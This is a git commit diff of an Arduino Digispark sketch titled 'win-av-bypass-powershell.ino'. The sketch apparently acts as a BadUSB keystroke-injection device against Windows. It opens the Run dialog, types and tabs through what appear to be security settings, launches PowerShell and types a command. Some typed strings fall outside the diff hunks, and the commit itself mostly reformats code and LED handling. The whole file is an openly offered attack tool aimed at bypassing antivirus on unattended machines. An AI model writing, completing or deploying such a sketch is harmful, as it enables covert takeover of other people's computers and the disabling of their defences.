fad97344b6af0d193fbe073c8d084657625c76b7
arman <sadoonarman@icloud.com>
2025-11-22 17:14:24 +0330

    Update win-av-bypass-powershell.ino

--- win-av-bypass-powershell.ino
+++ win-av-bypass-powershell.ino
@@ -1,18 +1,13 @@
 
 #include "DigiKeyboard.h"
 
-void setup() {
-     pinMode(0, OUTPUT);
-   
-
+  void setup() {
+     pinMode(1, OUTPUT);
     digitalWrite(1, HIGH); 
-    delay(200);          
-    
-    delay(200);
-    
+    delay(200);     
+    digitalWrite(1, LOW);      
     DigiKeyboard.sendKeyStroke(0);
     digitalWrite(1, HIGH); 
-
     DigiKeyboard.delay(2500);
     DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
     DigiKeyboard.delay(1100);
@@ -32,9 +27,6 @@ void setup() {
     DigiKeyboard.delay(8);
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
     DigiKeyboard.delay(3009);
-
-    
-
     DigiKeyboard.sendKeyStroke(43); 
     DigiKeyboard.delay(80);
     DigiKeyboard.sendKeyStroke(43); 
@@ -53,33 +45,20 @@ void setup() {
     DigiKeyboard.delay(80);
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
     DigiKeyboard.delay(2400);
-
-
     DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
     DigiKeyboard.delay(1000);
     DigiKeyboard.print("powershell");
     DigiKeyboard.delay(1000);
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
     DigiKeyboard.delay(3766);
-
     DigiKeyboard.print("po");
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
     DigiKeyboard.sendKeyStroke(KEY_M, MOD_GUI_LEFT);
 }
-void loop() {
-  digitalWrite(1, HIGH); 
-  delay(200);          
-  digitalWrite(1, LOW);  
-  delay(200);
+  void loop() {
+    digitalWrite(1, HIGH); 
+    delay(200);          
+    digitalWrite(1, LOW);  
+    delay(200);
 }
-
-
-
-
-
-
-
-
-
- 
 
